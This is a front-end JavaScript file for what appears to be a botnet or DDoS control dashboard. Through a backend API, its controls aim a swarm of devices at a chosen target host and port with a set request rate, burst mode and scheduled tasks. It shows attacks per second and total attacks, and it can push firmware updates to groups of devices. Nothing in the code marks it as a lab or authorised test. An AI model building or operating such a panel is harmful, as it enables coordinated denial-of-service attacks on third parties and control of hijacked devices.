const socket = io();
let dashboardState = null;
let selectedDevices = new Set();
let trafficChart = null;
let currentRange = 'live';
let pendingFirmwareFile = null;
const dynamicGroups = new Set();

function init() {
  bindNavigation();
  bindActions();
  initChart();
  fetchState();
}

function bindNavigation() {
  document.querySelectorAll('.nav-item').forEach((button) => {
    button.addEventListener('click', () => showSection(button.dataset.section));
  });
}

function showSection(section) {
  document.querySelectorAll('.nav-item').forEach((button) => button.classList.toggle('active', button.dataset.section === section));
  document.querySelectorAll('.page-section').forEach((node) => node.classList.toggle('active', node.dataset.section === section));
}

function bindActions() {
  document.getElementById('startSwarmBtn').addEventListener('click', () => sendControl('START'));
  document.getElementById('stopAllBtn').addEventListener('click', () => sendControl('STOP'));
  document.getElementById('saveConfigBtn').addEventListener('click', saveConfig);
  document.getElementById('bulkCommandBtn').addEventListener('click', () => sendControl('START', Array.from(selectedDevices)));
  document.getElementById('bulkFirmwareBtn').addEventListener('click', () => deviceAction('UPDATE_FIRMWARE'));
  document.getElementById('refreshDevicesBtn').addEventListener('click', fetchState);
  document.getElementById('emergencyStopBtn').addEventListener('click', emergencyStop);
  document.getElementById('topEmergencyStopBtn').addEventListener('click', emergencyStop);
  document.getElementById('selectAllDevices').addEventListener('change', toggleSelectAll);
  document.getElementById('manageSelectAll').addEventListener('change', toggleSelectAll);
  document.getElementById('deviceSearch').addEventListener('input', renderDevicesSection);
  document.getElementById('groupFilter').addEventListener('change', renderDevicesSection);
  document.getElementById('statusFilter').addEventListener('change', renderDevicesSection);
  document.getElementById('addGroupBtn').addEventListener('click', addGroup);
  document.getElementById('uploadFirmwareBtn').addEventListener('click', uploadFirmware);
  document.getElementById('deployFirmwareBtn').addEventListener('click', deployFirmware);
  document.getElementById('createTaskBtn').addEventListener('click', createTask);
  document.getElementById('firmwareFile').addEventListener('change', onFirmwareFileSelected);
  document.querySelectorAll('.filter').forEach((button) => {
    button.addEventListener('click', () => {
      document.querySelectorAll('.filter').forEach((node) => node.classList.toggle('active', node === button));
      currentRange = button.dataset.range;
      renderChart();
    });
  });
}

async function fetchState() {
  const response = await fetch('/api/stats');
  dashboardState = await response.json();
  syncGroups();
  hydrateControlForm();
  render();
}

function syncGroups() {
  dashboardState.groups.forEach((group) => dynamicGroups.add(group.name));
}

function hydrateControlForm() {
  const cfg = dashboardState.controlConfig;
  document.getElementById('targetHost').value = cfg.targetHost || '';
  document.getElementById('targetPort').value = cfg.targetPort || '';
  document.getElementById('requestRate').value = cfg.requestRate || '';
  document.getElementById('duration').value = cfg.duration || '';
  document.getElementById('startMode').value = cfg.startMode || 'immediate';
  document.getElementById('delayMs').value = cfg.delayMs || 0;
  document.getElementById('maxRequests').value = cfg.maxRequests || 0;
  document.getElementById('targets').value = (cfg.targets || []).join(', ');
  document.getElementById('burstMode').checked = Boolean(cfg.burstMode);
  document.getElementById('advancedControl').checked = Boolean(cfg.advancedControl);

  document.getElementById('taskTargetHost').value = cfg.targetHost || '';
  document.getElementById('taskTargetPort').value = cfg.targetPort || '';
  document.getElementById('taskRate').value = cfg.requestRate || '';
  document.getElementById('taskDuration').value = cfg.duration || '';
  document.getElementById('taskDelay').value = cfg.delayMs || 0;
}

function getConfigPayload() {
  return {
    targetHost: document.getElementById('targetHost').value.trim(),
    targetPort: Number(document.getElementById('targetPort').value || 0),
    requestRate: Number(document.getElementById('requestRate').value || 0),
    duration: Number(document.getElementById('duration').value || 0),
    startMode: document.getElementById('startMode').value,
    delayMs: Number(document.getElementById('delayMs').value || 0),
    maxRequests: Number(document.getElementById('maxRequests').value || 0),
    targets: document.getElementById('targets').value,
    burstMode: document.getElementById('burstMode').checked,
    advancedControl: document.getElementById('advancedControl').checked
  };
}

async function saveConfig() {
  await fetch('/api/config', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(getConfigPayload())
  });
  await fetchState();
}

async function sendControl(action, deviceIds = []) {
  await fetch('/api/control', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ...getConfigPayload(),
      action,
      selectedDevices: deviceIds
    })
  });
  await fetchState();
}

async function emergencyStop() {
  await sendControl('STOP', Array.from(selectedDevices));
}

async function deviceAction(action, deviceIds = Array.from(selectedDevices), extra = {}) {
  await fetch('/api/devices/action', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action, deviceIds, ...extra })
  });
  await fetchState();
}

function toggleSelectAll(event) {
  const checked = event.target.checked;
  selectedDevices.clear();
  getFilteredDevices().forEach((device) => {
    if (checked) selectedDevices.add(device.id);
  });
  renderDevicesTables();
}

function toggleDeviceSelection(deviceId, checked) {
  if (checked) selectedDevices.add(deviceId);
  else selectedDevices.delete(deviceId);
  renderSelectionBars();
}

function getFilteredDevices() {
  if (!dashboardState) return [];
  const search = (document.getElementById('deviceSearch')?.value || '').trim().toLowerCase();
  const group = document.getElementById('groupFilter')?.value || '';
  const status = document.getElementById('statusFilter')?.value || '';

  return dashboardState.devices.filter((device) => {
    const matchesSearch = !search || [device.id, device.ip, device.group].some((value) => String(value || '').toLowerCase().includes(search));
    const matchesGroup = !group || device.group === group;
    const matchesStatus = !status || device.status === status || device.activityState === status;
    return matchesSearch && matchesGroup && matchesStatus;
  });
}

function render() {
  if (!dashboardState) return;
  renderTopbar();
  renderStats();
  renderChart();
  renderQuickTasks();
  renderDevicesTables();
  renderDevicesSection();
  renderGroups();
  renderOta();
  renderTaskQueue();
  renderSystemHealth();
  renderConfig();
}

function renderTopbar() {
  document.getElementById('systemStatusText').textContent = dashboardState.stats.status;
  document.getElementById('socketDot').style.background = dashboardState.system.mqttBroker.status === 'Connected' ? '#00ff9c' : '#ff3366';
  document.getElementById('sidebarMqtt').textContent = dashboardState.system.mqttBroker.status;
  document.getElementById('sidebarApi').textContent = `${dashboardState.system.backendApi.latencyMs} ms`;
  document.getElementById('sidebarOta').textContent = dashboardState.system.otaServer.status;
}

function renderStats() {
  const stats = dashboardState.stats;
  document.getElementById('statRps').textContent = stats.attacksPerSecond;
  document.getElementById('statDevices').textContent = stats.onlineDevices;
  document.getElementById('statTotal').textContent = stats.totalAttacks.toLocaleString();
  document.getElementById('statPeak').textContent = stats.peakRate;
  document.getElementById('statIncrease').textContent = `${stats.requestsIncreasePct}% increase`;
  document.getElementById('statStatus').textContent = stats.status;
  document.getElementById('loadRps').textContent = stats.attacksPerSecond;
  document.getElementById('loadIncrease').textContent = `${stats.requestsIncreasePct}%`;
  document.getElementById('loadActiveDevices').textContent = stats.onlineDevices;
  document.getElementById('loadStatus').textContent = stats.status;
}

function initChart() {
  const ctx = document.getElementById('trafficChart').getContext('2d');
  trafficChart = new Chart(ctx, {
    type: 'bar',
    data: {
      labels: [],
      datasets: [
        { label: 'Traffic', data: [], backgroundColor: [] }
      ]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: { legend: { labels: { color: '#d9eeff' } } },
      scales: {
        x: { ticks: { color: '#8b9bb0' }, grid: { color: 'rgba(0,255,255,.06)' } },
        y: { ticks: { color: '#8b9bb0' }, grid: { color: 'rgba(0,255,255,.08)' }, beginAtZero: true }
      }
    }
  });
}

function renderChart() {
  if (!trafficChart || !dashboardState) return;
  let history = [...dashboardState.history];
  if (currentRange === '1m') history = history.slice(-12);
  if (currentRange === '5m') history = history.slice(-60);
  const labels = history.map((point) => new Date(point.time).toLocaleTimeString());
  const values = history.map((point) => point.count || 0);
  trafficChart.data.labels = labels;
  trafficChart.data.datasets[0].data = values;
  trafficChart.data.datasets[0].backgroundColor = values.map((value) => value > 20 ? 'rgba(255,51,102,.75)' : value > 8 ? 'rgba(255,212,107,.75)' : 'rgba(0,255,255,.65)');
  trafficChart.update();
}

function renderQuickTasks() {
  const container = document.getElementById('quickTasks');
  container.innerHTML = dashboardState.tasks.slice(0, 4).map(renderTaskItem).join('') || '<div class="list-item">No tasks scheduled.</div>';
}

function renderTaskItem(task) {
  return `<div class="task-row">
    <div>
      <strong>${task.name}</strong>
      <div class="task-meta">${task.type} · ${task.group} · ${new Date(task.scheduledAt).toLocaleString()}</div>
    </div>
    <span class="status-pill ${tagClass(task.status)}">${task.status}</span>
  </div>`;
}

function renderDevicesTables() {
  const devices = dashboardState.devices;
  const summary = getFilteredDevices();
  document.getElementById('deviceRows').innerHTML = summary.map((device) => renderDeviceRow(device, true)).join('') || `<tr><td colspan="8">No devices found.</td></tr>`;
  document.getElementById('deviceManagementRows').innerHTML = summary.map((device) => renderDeviceRow(device, false)).join('') || `<tr><td colspan="9">No devices found.</td></tr>`;
  renderSelectionBars();
  bindRowActions();
}

function renderDeviceRow(device, compact) {
  const statusText = device.status === 'online' ? device.activityState : 'Offline';
  return `<tr>
    <td><input type="checkbox" class="device-check" data-device-id="${device.id}" ${selectedDevices.has(device.id) ? 'checked' : ''}></td>
    <td>${device.id}</td>
    <td>${device.ip || 'N/A'}</td>
    ${compact ? '' : `<td>${device.group}</td>`}
    <td><span class="status-pill ${statusPillClass(statusText, device.status)}">${statusText}</span></td>
    <td>${device.attackRate || 0}/s</td>
    ${compact ? `<td>${device.firmwareVersion || 'n/a'}</td>` : `<td>${device.firmwareVersion || 'n/a'}</td>`}
    <td>${new Date(device.lastSeen).toLocaleTimeString()}</td>
    <td>
      <button class="btn btn-secondary small row-action" data-action="START_ATTACK" data-device-id="${device.id}">Start</button>
      <button class="btn btn-secondary small row-action" data-action="STOP_TASK" data-device-id="${device.id}">Stop</button>
    </td>
  </tr>`;
}

function statusPillClass(activityState, status) {
  if (status !== 'online') return 'status-offline';
  if (activityState === 'Running') return 'status-running';
  return 'status-idle';
}

function renderSelectionBars() {
  const count = selectedDevices.size;
  const markup = count > 0
    ? `<span>${count} device${count > 1 ? 's' : ''} selected</span><div class="inline-actions">
        <button class="btn btn-secondary small" data-bulk="START_ATTACK">Start Attack</button>
        <button class="btn btn-secondary small" data-bulk="STOP_TASK">Stop Task</button>
        <button class="btn btn-secondary small" data-bulk="UPDATE_FIRMWARE">Update Firmware</button>
        <button class="btn btn-secondary small" data-bulk="REBOOT_NODES">Reboot Nodes</button>
      </div>`
    : '';

  ['selectedBar', 'deviceManagementBar'].forEach((id) => {
    const node = document.getElementById(id);
    node.classList.toggle('hidden', count === 0);
    node.innerHTML = markup;
  });

  document.querySelectorAll('[data-bulk]').forEach((button) => {
    button.addEventListener('click', () => deviceAction(button.dataset.bulk));
  });
}

function bindRowActions() {
  document.querySelectorAll('.device-check').forEach((checkbox) => {
    checkbox.addEventListener('change', () => toggleDeviceSelection(checkbox.dataset.deviceId, checkbox.checked));
  });
  document.querySelectorAll('.row-action').forEach((button) => {
    button.addEventListener('click', () => deviceAction(button.dataset.action, [button.dataset.deviceId]));
  });
}

function renderDevicesSection() {
  const filtered = getFilteredDevices();
  document.getElementById('summaryTotalNodes').textContent = dashboardState.devices.length;
  document.getElementById('summaryOnlineNodes').textContent = dashboardState.devices.filter((device) => device.status === 'online').length;
  document.getElementById('summaryOfflineNodes').textContent = dashboardState.devices.filter((device) => device.status !== 'online').length;

  const groupFilter = document.getElementById('groupFilter');
  const otaGroupTarget = document.getElementById('otaGroupTarget');
  const taskGroup = document.getElementById('taskGroup');
  [groupFilter, otaGroupTarget, taskGroup].forEach((select) => {
    const current = select.value;
    const baseOption = select.id === 'groupFilter' ? '<option value="">All groups</option>' : '<option value="">All online devices</option>';
    select.innerHTML = baseOption + Array.from(dynamicGroups).sort().map((group) => `<option value="${group}">${group}</option>`).join('');
    select.value = current;
  });
}

function renderGroups() {
  const container = document.getElementById('groupList');
  container.innerHTML = dashboardState.groups.map((group) => `
    <div class="group-row">
      <div>
        <strong>${group.name}</strong>
        <div class="group-meta">${group.online}/${group.total} online</div>
      </div>
      <button class="btn btn-secondary small assign-group-btn" data-group="${group.name}">Assign selected</button>
    </div>
  `).join('') || '<div class="list-item">No groups created.</div>';

  document.querySelectorAll('.assign-group-btn').forEach((button) => {
    button.addEventListener('click', () => deviceAction('ASSIGN_GROUP', Array.from(selectedDevices), { group: button.dataset.group }));
  });
}

function addGroup() {
  const input = document.getElementById('newGroupName');
  const name = input.value.trim();
  if (!name) return;
  dynamicGroups.add(name);
  input.value = '';
  renderDevicesSection();
  renderGroups();
}

function onFirmwareFileSelected(event) {
  pendingFirmwareFile = event.target.files[0] || null;
  renderFirmwarePreview();
}

function renderFirmwarePreview() {
  const node = document.getElementById('firmwarePreview');
  if (!pendingFirmwareFile) {
    node.innerHTML = '<div class="list-item">No firmware file selected.</div>';
    return;
  }
  const valid = pendingFirmwareFile.name.toLowerCase().endsWith('.bin');
  node.innerHTML = `
    <div class="list-item"><strong>${pendingFirmwareFile.name}</strong><span>${(pendingFirmwareFile.size / 1024).toFixed(1)} KB · ${valid ? 'Valid .bin' : 'Invalid file type'}</span></div>
  `;
}

async function uploadFirmware() {
  if (!pendingFirmwareFile) return;
  await fetch('/api/ota/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      fileName: pendingFirmwareFile.name,
      fileSize: pendingFirmwareFile.size,
      version: document.getElementById('firmwareVersion').value.trim() || pendingFirmwareFile.name.replace('.bin', '')
    })
  });
  await fetchState();
}

async function deployFirmware() {
  await fetch('/api/ota/deploy', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      group: document.getElementById('otaGroupTarget').value,
      deviceIds: Array.from(selectedDevices)
    })
  });
  await fetchState();
}

function renderOta() {
  const preview = document.getElementById('firmwarePreview');
  if (pendingFirmwareFile) {
    renderFirmwarePreview();
  } else if (dashboardState.ota.available) {
    preview.innerHTML = `<div class="list-item"><strong>${dashboardState.ota.fileName}</strong><span>${dashboardState.ota.version} · ${(dashboardState.ota.fileSize / 1024).toFixed(1)} KB</span></div>`;
  } else {
    preview.innerHTML = '<div class="list-item">No firmware file selected.</div>';
  }
  document.getElementById('otaProgressPct').textContent = `${dashboardState.ota.rollout.progress}%`;
  document.getElementById('otaProgressBar').style.width = `${dashboardState.ota.rollout.progress}%`;
  document.getElementById('otaSuccess').textContent = dashboardState.ota.rollout.success;
  document.getElementById('otaUpdating').textContent = dashboardState.ota.rollout.updating;
  document.getElementById('otaFailed').textContent = dashboardState.ota.rollout.failed;

  document.getElementById('otaLogs').innerHTML = dashboardState.ota.rollout.logs.map((log) => `
    <div class="list-item"><strong>${log.deviceId}</strong><span>${log.status} · ${log.progress}%</span></div>
  `).join('') || '<div class="list-item">No rollout activity yet.</div>';
}

async function createTask() {
  const payload = {
    name: document.getElementById('taskName').value.trim(),
    type: document.getElementById('taskType').value,
    group: document.getElementById('taskGroup').value || 'All online devices',
    targetHost: document.getElementById('taskTargetHost').value.trim(),
    targetPort: Number(document.getElementById('taskTargetPort').value || 0),
    rate: Number(document.getElementById('taskRate').value || 0),
    duration: Number(document.getElementById('taskDuration').value || 0),
    delayMs: Number(document.getElementById('taskDelay').value || 0),
    executionMode: document.getElementById('taskExecutionMode').value,
    scheduledAt: document.getElementById('taskScheduledAt').value ? new Date(document.getElementById('taskScheduledAt').value).toISOString() : new Date().toISOString()
  };
  await fetch('/api/tasks', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  await fetchState();
}

function renderTaskQueue() {
  const node = document.getElementById('taskQueue');
  node.innerHTML = dashboardState.tasks.map((task) => `
    <div class="task-row">
      <div>
        <strong>${task.name}</strong>
        <div class="task-meta">${task.type} · ${task.group} · Rate ${task.rate} · Delay ${task.delayMs}ms</div>
      </div>
      <div class="inline-actions">
        <span class="status-pill ${tagClass(task.status)}">${task.status}</span>
        <button class="btn btn-secondary small remove-task" data-task-id="${task.id}">Remove</button>
      </div>
    </div>
  `).join('') || '<div class="list-item">No tasks queued.</div>';

  document.querySelectorAll('.remove-task').forEach((button) => {
    button.addEventListener('click', async () => {
      await fetch(`/api/tasks/${button.dataset.taskId}`, { method: 'DELETE' });
      await fetchState();
    });
  });
}

function tagClass(status) {
  if (status === 'Scheduled') return 'tag-scheduled';
  if (status === 'Recurring') return 'tag-recurring';
  return 'tag-queued';
}

function renderSystemHealth() {
  document.getElementById('systemHealthList').innerHTML = `
    <div class="health-row"><strong>MQTT Broker</strong><span>${dashboardState.system.mqttBroker.url} · ${dashboardState.system.mqttBroker.status}</span></div>
    <div class="health-row"><strong>Backend API</strong><span>${dashboardState.system.backendApi.latencyMs} ms · ${dashboardState.system.backendApi.status}</span></div>
    <div class="health-row"><strong>OTA Server</strong><span>${dashboardState.system.otaServer.status}</span></div>
  `;
}

function renderConfig() {
  document.getElementById('configMaxReq').textContent = dashboardState.controlConfig.maxRequests;
  document.getElementById('configBurst').textContent = dashboardState.controlConfig.burstMode ? 'On' : 'Off';
  document.getElementById('configAdvanced').textContent = dashboardState.controlConfig.advancedControl ? 'On' : 'Off';
}

socket.on('connect', () => {
  document.getElementById('socketDot').style.background = '#00ff9c';
});

socket.on('disconnect', () => {
  document.getElementById('socketDot').style.background = '#ff3366';
});

socket.on('dashboard-update', (state) => {
  dashboardState = state;
  syncGroups();
  render();
});

init();
